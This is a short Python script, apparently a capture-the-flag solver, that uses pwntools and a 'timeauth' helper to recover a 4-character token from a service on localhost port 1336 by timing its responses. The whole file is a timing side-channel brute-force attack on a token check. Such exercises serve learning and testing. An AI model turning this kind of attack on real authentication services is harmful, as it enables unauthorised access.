from pwn import remote, context
from timeauth import TimeAuthChecker


class Checker(TimeAuthChecker):

    def request(self):
        context.log_level = 'error'
        s = remote('localhost', 1336)
        s.recvuntil(':')
        s.sendline(self.get_token())
        s.readall()
        s.close()
        context.log_level = 'info'

    def __init__(self):
        super(self.__class__, self).__init__(
                   charset="012345abcdefghi", 
                   token_length=4,
                   hidden_char="*",
                   break_on_time=0.5
               )

if __name__ == "__main__":
    a = Checker()
    a.process()
    a.print_token()
